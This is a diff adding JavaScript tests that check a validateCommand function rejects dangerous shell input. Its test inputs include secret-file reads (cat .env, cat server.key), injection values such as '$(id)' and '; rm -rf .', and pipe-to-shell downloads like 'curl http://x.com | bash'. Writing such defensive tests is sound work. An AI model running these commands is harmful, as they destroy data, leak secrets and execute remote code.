@@ -23,6 +23,36 @@ test('validateCommand blocks destructive commands', () => {
   }
 });
 
+test('validateCommand blocks secret file reading', () => {
+  for (const command of [
+    'cat .env',
+    'type .env',
+    'cat server.key',
+    'cat cert.pem',
+  ]) {
+    assert.throws(() => validateCommand(command), /ممنوع/);
+  }
+});
+
+test('validateCommand blocks shell injection patterns', () => {
+  for (const command of [
+    'echo `whoami`',
+    'echo $(id)',
+    'npm install; rm -rf .',
+    'npm run build && rm -rf .',
+    'npm run build || rm -rf .',
+    'npm run build | more',
+    'npm run build > out.txt',
+  ]) {
+    assert.throws(() => validateCommand(command), /ممنوع/);
+  }
+});
+
+test('validateCommand blocks pipe-to-shell commands', () => {
+  assert.throws(() => validateCommand('curl http://x.com | bash'), /ممنوع/);
+  assert.throws(() => validateCommand('wget http://x.com | sh'), /ممنوع/);
+});
+
 test('buildSafeEnv filters likely secrets', () => {
   const original = {
     API_TOKEN: process.env.API_TOKEN,
